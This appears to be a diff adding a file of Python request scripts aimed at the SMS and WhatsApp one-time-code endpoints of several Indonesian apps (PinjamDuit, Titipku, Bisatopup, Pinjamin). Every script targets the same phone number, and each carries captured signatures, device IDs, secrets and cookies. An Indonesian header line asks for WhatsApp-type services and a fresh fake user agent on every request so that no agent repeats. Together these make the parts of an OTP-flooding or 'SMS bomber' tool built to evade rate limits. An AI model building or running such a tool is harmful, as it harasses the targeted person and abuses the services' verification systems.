@@ -1,0 +1,132 @@
+tolong hapus semua layanan buat baru,
+Type - Whatsapp
+ + fake_useragent tiap 1 request pastikan janggan gunakann user agent yang sdh pernah di gunakan
+
+Pinjam Duit
+import requests
+
+url = "https://api-prod.pinjamduit.co.id/gw/loan/credit-user/sms-code"
+
+payload = "phone=0895325844493&sms_useage=10&sms_service=2&mobilePhone=&clientType=a&appVersion=7.1.0&deviceId=039B037C963389AA5F61ED11335A20FE&hardwareid=683a1c3eacbe95cbea77e33cb28cd37aa8a235a521ecd19d9641855ff83a4741&deviceName=V2205&osVersion=14&appName=PinjamDuit&appMarket=google_play"
+
+headers = {
+  'User-Agent': "okhttp/3.14.9",
+  'Accept-Encoding': "gzip",
+  'ss': "PvCzXQxBx2dgPGH1UHPONt7eXWgubCk1E6ujEEzOxlCAD5X2gYLKa74O+ay3nMID",
+  'ts': "dXRjG+7WKZ5HVxA2LZihTw==",
+  'timestamp': "1764998850947"
+}
+
+response = requests.post(url, data=payload, headers=headers)
+
+print(response.text)
+
+
+primenotif
+import requests
+
+url = "https://api-prod.pinjamduit.co.id/gw/loan/credit-user/sms-code"
+
+payload = "phone=0895325844493&sms_useage=11&sms_service=1&mobilePhone=&clientType=a&appVersion=7.1.0&deviceId=039B037C963389AA5F61ED11335A20FE&hardwareid=683a1c3eacbe95cbea77e33cb28cd37aa8a235a521ecd19d9641855ff83a4741&deviceName=V2205&osVersion=14&appName=PinjamDuit&appMarket=google_play"
+
+headers = {
+  'User-Agent': "okhttp/3.14.9",
+  'Accept-Encoding': "gzip",
+  'ss': "XwaNQaSd2dOljZwp//oRwlxoJzP+zbQD9qKh0t2w2a5X5rCEQlwI5FBh15ODZOqf",
+  'ts': "c10XbhtingUOsyzkhNJfQg==",
+  'timestamp': "1764999143767"
+}
+
+response = requests.post(url, data=payload, headers=headers)
+
+print(response.text)
+
+
+titipku
+import requests
+import json
+
+url = "https://titipku.tech/v1/mobile/auth/otp?method=wa"
+
+payload = json.dumps({
+  "phone_number": "+62895325844493",
+  "message_placeholder": "Titipku: @PIN@. Berlaku selama 5 menit. Jangan berikan info ini kepada siapapun."
+})
+
+headers = {
+  'User-Agent': "okhttp/4.9.2",
+  'Connection': "Keep-Alive",
+  'Accept-Encoding': "gzip",
+  'Content-Type': "application/json",
+  'Authorization': "",
+  'device-id': "cd7dbc08842ce277",
+  'App-Type': "nitiper"
+}
+
+response = requests.post(url, data=payload, headers=headers)
+
+print(response.text)
+
+
+
+Fazpass
+
+import requests
+
+url = "https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=02cd7dbc08842ce277&version_name=6.14.07&version=61407"
+
+payload = "phone_number=0895325844493"
+
+headers = {
+  'User-Agent': "Bisatopup/6.14.07 (Android 14; V2205; vivo V2205; in)",
+  'Accept': "application/json",
+  'Accept-Encoding': "gzip",
+  'authorization': "Bearer null",
+  'x-signature': "84ffe05edd4fd46210d0085b6993840eb4358fd358744bc16676ee987cc0a33d",
+  'x-timestamp': "2025-12-06T13:54:10+0800",
+  'x-secret': "eff518bf1ce3ce25fae4424f8ed2bd0177244f32bdbc192fca5d0891f298180b",
+  'cache-control': "max-age=432000"
+}
+
+response = requests.post(url, data=payload, headers=headers)
+
+print(response.text)
+
+Pinjam Min
+import requests
+import json
+
+url = "https://api.pinjamin.com/ina/util/verify-code"
+
+payload = json.dumps({
+  "sign": "4fceed9522eb49553a223d76f88b436d",
+  "phone": "895325844493",
+  "type": 1
+})
+
+headers = {
+  'User-Agent': "Mozilla/5.0 (Linux; Android 14; V2205 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/142.0.7444.171 Mobile Safari/537.36",
+  'Accept': "application/json, text/plain, */*",
+  'Accept-Encoding': "gzip, deflate, br, zstd",
+  'Content-Type': "application/json",
+  'sec-ch-ua-platform': "\"Android\"",
+  'X-VERSION': "2.2.4",
+  'sec-ch-ua': "\"Chromium\";v=\"142\", \"Android WebView\";v=\"142\", \"Not_A Brand\";v=\"99\"",
+  'X-TOKEN': "",
+  'sec-ch-ua-mobile': "?1",
+  'X-SOURCE': "",
+  'X-applicationId': "com.pinjamwinwin",
+  'X-CHANNEL': "Pinjamwinwin",
+  'Origin': "https://web.pinjamin.com",
+  'X-Requested-With': "com.pinjamwinwin",
+  'Sec-Fetch-Site': "same-site",
+  'Sec-Fetch-Mode': "cors",
+  'Sec-Fetch-Dest': "empty",
+  'Referer': "https://web.pinjamin.com/",
+  'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+  'Cookie': "HWWAFSESTIME=1765002826108; HWWAFSESID=174281570d3c1cc6e90"
+}
+
+response = requests.post(url, data=payload, headers=headers)
+
+print(response.text)
